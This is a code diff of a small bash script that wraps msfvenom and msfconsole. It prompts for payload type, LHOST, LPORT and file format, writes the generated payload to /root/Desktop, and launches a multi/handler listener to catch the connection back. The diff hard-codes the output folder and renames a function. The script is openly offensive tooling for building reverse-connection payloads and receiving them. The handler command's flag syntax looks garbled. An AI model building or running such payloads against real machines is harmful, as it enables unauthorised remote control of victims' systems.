@@ -20,13 +20,12 @@ read -p "name of your payload : " payload
 read -p "format file : " format
 read -p "Lhost : " host
 read -p "Lport : " port
-read -p "Place of payload :  " place
 echo "pleas wait a few secands............/"
 sleep 3
-xterm -e "msfvenom -p $plod Lhost=$host Lport=$port R> /root/$place/$payload.$format"
-function r {
+xterm -e "msfvenom -p $plod Lhost=$host Lport=$port R> /root/Desktop/$payload.$format"
+function metasploit {
 msfconsole -q -x "use multi/handler -p $plod -H $host -p $port -r run"
 }
-r
-echo -e "$blue Returen again <3"
+metasploit
+echo -e "$green Returen again <3"
 
